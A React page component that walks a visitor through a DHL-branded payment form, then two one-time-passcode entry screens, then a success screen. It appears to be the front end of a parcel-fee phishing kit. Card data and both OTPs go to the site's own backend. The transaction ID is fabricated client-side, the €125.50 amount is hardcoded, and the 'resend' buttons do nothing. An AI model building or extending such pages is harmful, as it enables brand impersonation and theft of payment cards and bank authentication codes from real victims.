import { useState } from "react";
import { useMutation } from "@tanstack/react-query";
import DHLPaymentForm, { type PaymentFormData } from "@/components/DHLPaymentForm";
import OTPVerification from "@/components/OTPVerification";
import PaymentSuccess from "@/components/PaymentSuccess";
import { apiRequest } from "@/lib/queryClient";

type PaymentStep = "payment" | "otp1" | "otp2" | "success";

export default function HomePage() {
  const [step, setStep] = useState<PaymentStep>("payment");
  const [paymentId, setPaymentId] = useState<string>("");
  const [transactionId, setTransactionId] = useState<string>("");

  const startPaymentMutation = useMutation({
    mutationFn: async (data: PaymentFormData) => {
      const response = await apiRequest("POST", "/api/payment/start", data);
      const result = await response.json();
      return result as { paymentId: string };
    },
    onSuccess: (data) => {
      setPaymentId(data.paymentId);
      setStep("otp1");
    },
  });

  const otp1Mutation = useMutation({
    mutationFn: async (otp: string) => {
      await apiRequest("POST", `/api/payment/${paymentId}/otp1`, { otp });
    },
    onSuccess: () => {
      setStep("otp2");
    },
  });

  const otp2Mutation = useMutation({
    mutationFn: async (otp: string) => {
      await apiRequest("POST", `/api/payment/${paymentId}/otp2`, { otp });
    },
    onSuccess: () => {
      setTransactionId(`TXN-${Date.now()}`);
      setStep("success");
    },
  });

  const handlePaymentSubmit = (data: PaymentFormData) => {
    startPaymentMutation.mutate(data);
  };

  const handleOtp1Submit = (otp: string) => {
    otp1Mutation.mutate(otp);
  };

  const handleOtp2Submit = (otp: string) => {
    otp2Mutation.mutate(otp);
  };

  const handleReturnHome = () => {
    setStep("payment");
    setPaymentId("");
    setTransactionId("");
  };

  return (
    <>
      {step === "payment" && <DHLPaymentForm onSubmit={handlePaymentSubmit} />}
      {step === "otp1" && (
        <OTPVerification
          step={1}
          onSubmit={handleOtp1Submit}
          onResend={() => console.log("Resend OTP 1")}
        />
      )}
      {step === "otp2" && (
        <OTPVerification
          step={2}
          onSubmit={handleOtp2Submit}
          onResend={() => console.log("Resend OTP 2")}
        />
      )}
      {step === "success" && (
        <PaymentSuccess
          onReturnHome={handleReturnHome}
          paymentDetails={{
            amount: "€125.50",
            transactionId: transactionId,
            date: new Date().toLocaleDateString("fr-FR"),
          }}
        />
      )}
    </>
  );
}
